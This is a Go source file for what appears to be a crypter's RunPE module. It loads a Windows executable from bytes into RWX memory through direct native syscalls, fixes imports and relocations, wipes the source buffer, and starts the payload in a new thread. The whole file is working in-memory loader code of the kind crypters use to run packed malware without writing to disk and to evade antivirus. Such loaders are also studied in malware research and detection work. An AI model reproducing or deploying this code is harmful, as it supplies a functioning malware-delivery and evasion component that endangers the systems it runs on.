package runpe 

import (
	"bytes"
	api "github.com/carved4/go-wincall"
	sys "github.com/carved4/go-native-syscall"
	"github.com/Binject/debug/pe"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"unsafe"
	"go-crypter/pkg/types"
	"strings"
	"strconv"
	"runtime"
	"runtime/debug"
)

func cstringAt(addr uintptr) string {
	var b []byte
	for {
		c := *(*byte)(unsafe.Pointer(addr))
		if c == 0 {
			break
		}
		b = append(b, c)
		addr++
	}
	return string(b)
}

func isForwardedExport(moduleHandle unsafe.Pointer, procAddr uintptr) bool {
	dosHeader := (*types.IMAGE_DOS_HEADER)(moduleHandle)
	if dosHeader.E_magic != 0x5A4D {
		return false
	}

	ntHeaders := (*types.IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(dosHeader.E_lfanew)))
	if ntHeaders.Signature != 0x4550 {
		return false
	}

	exportDir := &ntHeaders.OptionalHeader.DataDirectory[types.IMAGE_DIRECTORY_ENTRY_EXPORT]
	if exportDir.VirtualAddress == 0 {
		return false
	}

	exportStart := uintptr(moduleHandle) + uintptr(exportDir.VirtualAddress)
	exportEnd := exportStart + uintptr(exportDir.Size)
	
	return procAddr >= exportStart && procAddr < exportEnd
}

func resolveForwardedExport(forwarderString string) (uintptr, error) {
	parts := strings.Split(forwarderString, ".")
	if len(parts) != 2 {
		return 0, fmt.Errorf("[ERROR] invalid forwarder string format: %s", forwarderString)
	}

	targetDLL := parts[0]
	targetFunction := parts[1]

	if !strings.HasSuffix(strings.ToLower(targetDLL), ".dll") {
		targetDLL += ".dll"
	}
	dllHandle := api.LoadLibraryW(targetDLL)

	var funcAddr uintptr
	var err error
	if strings.HasPrefix(targetFunction, "#") {
		ordinalStr := targetFunction[1:]
		ordinal, err := strconv.Atoi(ordinalStr)
		if err != nil {
			return 0, fmt.Errorf("[ERROR] invalid ordinal in forwarder: %s", targetFunction)
		}
		funcAddr, err = api.Call("kernel32.dll", "GetProcAddress", dllHandle, uintptr(ordinal))
		if err != nil {
			return 0, fmt.Errorf("[ERROR] failed to get ordinal %d from %s: %v", ordinal, targetDLL, err)
		}
	} else {
		funcNameBytes := append([]byte(targetFunction), 0)
		funcAddr, err = api.Call("kernel32.dll", "GetProcAddress", dllHandle, uintptr(unsafe.Pointer(&funcNameBytes[0])))
		if err != nil {
			return 0, fmt.Errorf("[ERROR] failed to get function %s from %s: %v", targetFunction, targetDLL, err)
		}
	}

	return funcAddr, nil
}

func checkForwardedExportByName(moduleHandle unsafe.Pointer, functionName string) (uintptr, bool) {
	dosHeader := (*types.IMAGE_DOS_HEADER)(moduleHandle)
	if dosHeader.E_magic != 0x5A4D {
		return 0, false
	}
	
	ntHeaders := (*types.IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(dosHeader.E_lfanew)))
	if ntHeaders.Signature != 0x4550 {
		return 0, false
	}

	exportDir := &ntHeaders.OptionalHeader.DataDirectory[types.IMAGE_DIRECTORY_ENTRY_EXPORT]
	if exportDir.VirtualAddress == 0 {
		return 0, false
	}

	exportTable := (*types.IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(exportDir.VirtualAddress)))
	
	nameArray := (*[^uint32(0)]uint32)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(exportTable.AddressOfNames)))
	ordinalArray := (*[^uint32(0)]uint16)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(exportTable.AddressOfNameOrdinals)))
	functionArray := (*[^uint32(0)]uint32)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(exportTable.AddressOfFunctions)))

	for i := uint32(0); i < exportTable.NumberOfNames; i++ {
		nameRVA := nameArray[i]
		nameAddr := uintptr(moduleHandle) + uintptr(nameRVA)
		exportName := cstringAt(nameAddr)
		
		if exportName == functionName {
			ordinal := ordinalArray[i]
			funcRVA := functionArray[ordinal]
			funcAddr := uintptr(moduleHandle) + uintptr(funcRVA)
			
			exportStart := uintptr(moduleHandle) + uintptr(exportDir.VirtualAddress)
			exportEnd := exportStart + uintptr(exportDir.Size)
			
			if funcAddr >= exportStart && funcAddr < exportEnd {
				return funcAddr, true
			}
			
			return 0, false
		}
	}
	
	return 0, false
}

func LoadPEFromBytes(peBytes []byte) error {
	if len(peBytes) == 0 {
		return fmt.Errorf("[ERROR] empty PE bytes provided")
	}
	
	return peLoader(&peBytes)
}

func LoadPEFromFile(filePath string) error {
	peBytes, err := ioutil.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("[ERROR] failed to read PE file: %v", err)
	}
	
	return LoadPEFromBytes(peBytes)
}

func fixImportAddressTable(baseAddress uintptr, peFile *pe.File) error {

	if peFile == nil {
		return fmt.Errorf("[ERROR] invalid PE file")
	}

	importDirs, _, _, err := peFile.ImportDirectoryTable()
	if err != nil {
		return fmt.Errorf("[ERROR] failed to get import directory table: %v", err)
	}

	if len(importDirs) == 0 {
		return nil
	}


	for _, importDir := range importDirs {
		dllName := importDir.DllName

		dllHandle := api.LoadLibraryW(dllName)


		firstThunk := baseAddress + uintptr(importDir.FirstThunk)
		originalThunk := baseAddress + uintptr(importDir.OriginalFirstThunk)
		if importDir.OriginalFirstThunk == 0 {
			originalThunk = firstThunk
		}

		funcCount := 0
		for {
			ftThunk := (*types.ImageThunkData64)(unsafe.Pointer(firstThunk))
			oftThunk := (*types.ImageThunkData64)(unsafe.Pointer(originalThunk))

			if ftThunk.AddressOfData == 0 {
				break
			}

			var funcNamePtr unsafe.Pointer
			var funcName string
			
			if types.IsMSBSet(oftThunk.AddressOfData) {
				funcNamePtr, funcName = types.ParseOrdinal(oftThunk.AddressOfData)
			} else {
				funcNamePtr, funcName = types.ParseFuncAddress(baseAddress, oftThunk.AddressOfData)
			}

			procAddr, err := api.Call("kernel32.dll", "GetProcAddress", dllHandle, uintptr(funcNamePtr))
			if err != nil {
				forwarderAddr, isForwarded := checkForwardedExportByName(unsafe.Pointer(dllHandle), funcName)
				if isForwarded {
					forwarderString := cstringAt(forwarderAddr)
					realProcAddr, err := resolveForwardedExport(forwarderString)
					if err != nil {
						return fmt.Errorf("[ERROR] failed to resolve forwarded export %s: %v", forwarderString, err)
					}
					procAddr = realProcAddr
				} else {
					return fmt.Errorf("[ERROR] failed to get proc address for %s function '%s': %v", dllName, funcName, err)
				}
			} else {
				if isForwardedExport(unsafe.Pointer(dllHandle), procAddr) {
					forwarderString := cstringAt(procAddr)
				
					realProcAddr, err := resolveForwardedExport(forwarderString)
					if err != nil {
						return fmt.Errorf("[ERROR] failed to resolve forwarded export %s: %v", forwarderString, err)
					}
					procAddr = realProcAddr
				}
			}

			ftThunk.AddressOfData = procAddr

			firstThunk += unsafe.Sizeof(types.ImageThunkData64{})
			originalThunk += unsafe.Sizeof(types.ImageThunkData64{})
			funcCount++
		}

	}
	return nil
}

func str1(a string) string {
	return a
}

func fixRelocTable(loadedAddr uintptr, perferableAddr uintptr, relocDir *types.IMAGE_DATA_DIRECTORY) error {
	
	if relocDir == nil {
		return fmt.Errorf("[ERROR] relocation directory is nil")
	}
	
	maxSizeOfDir := relocDir.Size
	relocBlocks := relocDir.VirtualAddress
	
	if maxSizeOfDir == 0 || relocBlocks == 0 {
		return fmt.Errorf("[ERROR] invalid relocation directory: size=%d, rva=0x%x", maxSizeOfDir, relocBlocks)
	}
	
	var relocBlockMetadata *types.IMAGE_BASE_RELOCATION
	relocBlockOffset := uintptr(0)
	processedBlocks := 0
	
	for ; relocBlockOffset < uintptr(maxSizeOfDir); relocBlockOffset += uintptr(relocBlockMetadata.SizeOfBlock) {
		relocBlockAddr := loadedAddr + uintptr(relocBlocks) + relocBlockOffset
		relocBlockMetadata = (*types.IMAGE_BASE_RELOCATION)(unsafe.Pointer(relocBlockAddr))
		
		if relocBlockMetadata.VirtualAddress == 0 || relocBlockMetadata.SizeOfBlock == 0 {
			break
		}
		
		if relocBlockMetadata.SizeOfBlock < 8 {
			return fmt.Errorf("[ERROR] invalid relocation block size: %d (minimum is 8)", relocBlockMetadata.SizeOfBlock)
		}
		
		entriesNum := (uintptr(relocBlockMetadata.SizeOfBlock) - unsafe.Sizeof(types.IMAGE_BASE_RELOCATION{})) / unsafe.Sizeof(types.ImageReloc{})
		pageStart := relocBlockMetadata.VirtualAddress
		
		relocEntryCursor := (*types.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocBlockMetadata)) + unsafe.Sizeof(types.IMAGE_BASE_RELOCATION{})))

		processedEntries := 0
		for i := 0; i < int(entriesNum); i++ {
			relocType := relocEntryCursor.GetType()
			if relocType == 0 {
				relocEntryCursor = (*types.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocEntryCursor)) + unsafe.Sizeof(types.ImageReloc{})))
				continue
			}

			relocationAddr := uintptr(pageStart) + loadedAddr + uintptr(relocEntryCursor.GetOffset())
			
			if relocationAddr < loadedAddr || relocationAddr >= loadedAddr+uintptr(maxSizeOfDir) {
			}
			
			if relocType == 3 {
				originalValue := *(*uint32)(unsafe.Pointer(relocationAddr))
				newValue := uint32(uintptr(originalValue) + loadedAddr - perferableAddr)
				*(*uint32)(unsafe.Pointer(relocationAddr)) = newValue
				processedEntries++
			} else if relocType == 10 { // IMAGE_REL_BASED_DIR64 (64-bit)
				originalValue := *(*uint64)(unsafe.Pointer(relocationAddr))
				newValue := uint64(uintptr(originalValue) + loadedAddr - perferableAddr)
				*(*uint64)(unsafe.Pointer(relocationAddr)) = newValue
				processedEntries++
			}
			
			relocEntryCursor = (*types.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocEntryCursor)) + unsafe.Sizeof(types.ImageReloc{})))
		}
		
		processedBlocks++
	}
	
	if processedBlocks == 0 {
		return fmt.Errorf("[ERROR] no relocation blocks processed")
	}
	
	return nil
}

func CopySections(pefile *pe.File, image *[]byte, loc uintptr) error {
	
	for _, section := range pefile.Sections {
		if section.Size == 0 {
			continue
		}
		d, err := section.Data()
		if err != nil {
			return fmt.Errorf("[ERROR] failed to read section %s: %v", section.Name, err)
		}
		dataLen := uint32(len(d))
		dst := uint64(loc) + uint64(section.VirtualAddress)
		buf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(dst)))
		for index := uint32(0); index < dataLen; index++ {
			buf[index] = d[index]
		}
	}

	bbuf := bytes.NewBuffer(nil)
	binary.Write(bbuf, binary.LittleEndian, pefile.COFFSymbols)
	binary.Write(bbuf, binary.LittleEndian, pefile.StringTable)
	b := bbuf.Bytes()
	blen := uint32(len(b))
	baseBuf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(loc)))
	for index := uint32(0); index < blen; index++ {
		baseBuf[index+pefile.FileHeader.PointerToSymbolTable] = b[index]
	}

	return nil
}

func peLoader(bytes0 *[]byte) error {
	
	if len(*bytes0) < 64 {
		return fmt.Errorf("[ERROR] PE file too small (less than 64 bytes)")
	}
	
	// the go garbage collector is the ultimate fucking evil monster of death capable of destroying your memory buffer intermittently
	// so we need to use ALLLL the methods to fucking REMOVE the fucking go garbage collector. excuse my language, i hate the go garbage collector
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	runtime.GC()
	runtime.GC()
	
	oldGCPercent := debug.SetGCPercent(-1)
	defer debug.SetGCPercent(oldGCPercent)
	
	pinnedBytes := make([]byte, len(*bytes0))
	copy(pinnedBytes, *bytes0)
	
	defer func() {
		runtime.KeepAlive(pinnedBytes)
		runtime.KeepAlive(bytes0)
		runtime.KeepAlive(&pinnedBytes[0])
	}()
	
	baseAddr := uintptr(unsafe.Pointer(&pinnedBytes[0]))
	
	if baseAddr == 0 {
		return fmt.Errorf("[ERROR] invalid base address")
	}
	
	tgtFile := types.NtH(baseAddr)
	if tgtFile == nil {
		return fmt.Errorf("[ERROR] invalid PE file - cannot parse NT headers")
	}

	peF, err := pe.NewFile(bytes.NewReader(pinnedBytes))
	if err != nil {
		return fmt.Errorf("[ERROR] failed to parse PE file: %v", err)
	}
	
	relocTable := types.GetRelocTable(tgtFile)
	preferableAddress := tgtFile.OptionalHeader.ImageBase

	status, err := sys.NtUnmapViewOfSection(0xffffffffffffffff, uintptr(tgtFile.OptionalHeader.ImageBase))
	if err != nil {
		// continue anyway, lazy but it could be expected
	}

	var imageBaseForPE uintptr
	regionSize := uintptr(tgtFile.OptionalHeader.SizeOfImage)
	
	imageBaseForPE = uintptr(preferableAddress)
	status, err = sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)

	if status != 0 && relocTable == nil {
		return fmt.Errorf("[ERROR] no relocation table and cannot load to preferred address (status: 0x%x)", status)
	}
	
	if status != 0 && relocTable != nil {
		imageBaseForPE = 0
		regionSize = uintptr(tgtFile.OptionalHeader.SizeOfImage)
		status, err = sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)

		if status != 0 {
			return fmt.Errorf("[ERROR] cannot allocate memory for PE (status: 0x%x, err: %v)", status, err)
		}
	}

	headersSize := tgtFile.OptionalHeader.SizeOfHeaders
	copy((*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:headersSize], pinnedBytes[:headersSize])
	
	mappedDosHeader := (*types.IMAGE_DOS_HEADER)(unsafe.Pointer(imageBaseForPE))
	mappedNtHeader := (*types.IMAGE_NT_HEADERS)(unsafe.Pointer(imageBaseForPE + uintptr(mappedDosHeader.E_lfanew)))
	
	if mappedNtHeader.Signature != 0x4550 {
		return fmt.Errorf("[ERROR] invalid NT Signature: 0x%x", mappedNtHeader.Signature)
	}
	
	tgtFile.OptionalHeader.ImageBase = uint64(imageBaseForPE)
	mappedNtHeader.OptionalHeader.ImageBase = uint64(imageBaseForPE)

	if err := CopySections(peF, &pinnedBytes, imageBaseForPE); err != nil {
		return fmt.Errorf("[ERROR] failed to copy sections: %v", err)
	}

	if err := fixImportAddressTable(imageBaseForPE, peF); err != nil {
		return fmt.Errorf("[ERROR] failed to fix import address table: %v", err)
	}

	if imageBaseForPE != uintptr(preferableAddress) {
		if relocTable != nil {
			if err := fixRelocTable(imageBaseForPE, uintptr(preferableAddress), (*types.IMAGE_DATA_DIRECTORY)(unsafe.Pointer(relocTable))); err != nil {
				return fmt.Errorf("[ERROR] failed to fix relocation table: %v", err)
			}
		}
	}
	
	entryPointRVA := mappedNtHeader.OptionalHeader.AddressOfEntryPoint
	
	startAddress := imageBaseForPE + uintptr(entryPointRVA)

	types.Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
	
	runtime.KeepAlive(pinnedBytes)
	runtime.KeepAlive(bytes0)
	runtime.KeepAlive(&pinnedBytes[0])
	
	var threadHandle uintptr
	status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
	if status != 0 {
		return fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
	}

	runtime.KeepAlive(pinnedBytes)
	runtime.KeepAlive(bytes0)
	runtime.KeepAlive(&pinnedBytes[0])

	status, err = sys.NtWaitForSingleObject(threadHandle, false, nil)
	if status == 0 {
	} else if status == 0x80000004 {
		status = 0
	} else if status == 0x00000102 {
		status = 0
	} else {
		return fmt.Errorf("[ERROR] thread execution failed with status: 0x%x", status)
	}
	
	runtime.KeepAlive(pinnedBytes)
	runtime.KeepAlive(bytes0)
	runtime.KeepAlive(&pinnedBytes[0])
	
	sys.NtClose(threadHandle)
	
	return nil	
}
